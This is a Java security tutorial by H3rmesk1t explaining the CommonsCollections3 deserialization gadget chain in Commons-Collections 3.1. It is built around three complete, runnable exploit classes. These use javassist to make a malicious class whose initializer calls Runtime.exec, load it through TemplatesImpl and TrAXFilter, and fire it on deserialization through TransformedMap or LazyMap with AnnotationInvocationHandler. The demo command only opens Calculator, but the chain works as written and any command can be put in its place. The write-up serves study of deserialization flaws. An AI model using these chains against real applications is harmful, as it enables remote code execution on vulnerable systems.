# Java Security Learning-Commons-Collections3 Chain

Author: H3rmesk1t

#Environmental construction
> 1. `JDK` version: JDK1.8u66 (requires JDK8u71 below)
> 2. `Commons-Collections` version: 3.1

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## TrAXFilter
> The constructor of this class is called `(TransformerImpl) templates.newTransformer()`, eliminating the manual call of the `newTransformer()` method with `InvokerTransformer`.

<img src="./images/9.png">

## InstantiateTransformer
> Although the above directly calls `newTransformer()`, the constructor of `TrAXFilter` is missing, and the constructor of `TrAXFilter` cannot be called. Therefore, here we use `org.apache.commons.collections.functors.InstantiateTransformer` provided by `Commons-Collections` to create class instances through reflection. The `transform()` method receives an object of type `Class`, obtains the constructor method through `getConstructor()`, and creates a class instance through `newInstance()`

<img src="./images/10.png" alt="">

# CommonsCollections3 Analysis
> The `CommonsCollections3` chain is actually a combination of the `CommonsCollections1` chain and the `CommonsCollections2` chain. In order to bypass the restrictions on InvokerTransformer` by some rules, `CommonsCollections3` does not use `InvokerTransformer` to call any method. According to the above pre-knowledge, you can use `InstantiateTransformer()` to call the `TrAXFilter()` constructor method, and then use its `templates.newTransformer()` of its constructor method to call the `TemplatesImpl` bytecode, which is better than avoiding the use of `InvokerTransformer`

```java
package CommonsCollections3;

import java.io.*;
import java.lang.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 10:33 pm
 */
public class TrAxFilterDemo {

    public static void trAxFilterDemo() throws IllegalAccessException, NoSuchFieldException, NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("Evil");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetByteCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = templates.getClass();
        Field _name = c1.getDeclaredField("_name");
        Field _bytecode = c1.getDeclaredField("_bytecodes");
        Field _tfactory = c1.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Tran
sformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outerMap.put("d1no", "web");
    }

    public static void main(String[] args) {
        try {
            trAxFilterDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/11.png" alt="">

## TransformedMap

```java
package CommonsCollections3;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 9:38 pm
 */
public class CommonsCollections3TransformedMap {

    public static void CC3() throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellByteCode = ctClass.toBytecode();
        byte[][] targetByteCode = new byte[][]{shellByteCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class _class = obj.getClass();
        Field _name = _class.getDeclaredField("_name");
        Field _bytecode = _class.getDeclaredField("_bytecodes");
        Field _tfactory = _class.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetByteCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        map.put("value", "d1no");
        Map map1 = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Retention.class, map1);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(object);
objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC3();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/12.png" alt="">

## LazyMap

```java
package CommonsCollections3;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 1:20 am
 */
public class CommonsCollections3LazyMap {

    public static void CC3() throws CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Rvil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetShellCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class _class = templates.getClass();
        Field _name = _class.getDeclaredField("_name");
        Field _bytecode = _class.getDeclaredField("_bytecodes");
        Field _tfactory = _class.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetShellCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        Map map1 = LazyMap.decorate(map, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map1);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new Object
OutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(handler);
            objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC3();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/13.png" alt="">

# Call chain

```java
AnnotationInvocationHandler.readObject()
   Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                            TemplatesImpl.newTransformer()
```

# Summarize
> Use the `AnnotationInvocationHandler` to trigger the `Map```get/set` and other operations during deserialization. When performing the operation of the `Map` object, the `Transformer` conversion method will be called according to different situations. Use the `InstantiateTransformer` to instantiate the `TrAXFilter` class, and call the `newTransformer` method of `TemplatesImpl` to instantiate the malicious class bytecode trigger vulnerability